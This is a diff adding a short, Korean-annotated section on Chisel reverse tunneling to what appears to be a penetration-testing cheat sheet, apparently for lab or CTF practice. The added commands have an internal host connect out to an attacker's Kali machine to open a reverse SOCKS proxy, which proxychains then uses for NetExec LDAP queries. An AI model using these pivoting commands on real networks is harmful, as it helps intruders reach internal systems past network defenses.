@@ -71,6 +71,17 @@ listener_add --addr 0.0.0.0:8888 --to <lhost>:80
 <details>
   <summary><strong>Chisel</strong></summary>
 
+### Reverse Tunneling
+- 터널 연결을 생성한 방향과 SOCKS 프록시를 사용하는 방향이 반대
+- 내부 클라이언트가 Kali로 터널을 먼저 연결하고, R:socks를 통해 Kali가 받은 SOCKS 연결을 내부 클라이언트에서 내보내는 구조
+```
+./chisel server -p 1234 --reverse
+
+./chisel client -v 10.10.14.17:1234 R:socks
+
+proxychains nxc ldap <target>
+```
+
 ### Port Forwarding
 ```bash
 ./chisel server -p 8000 --reverse
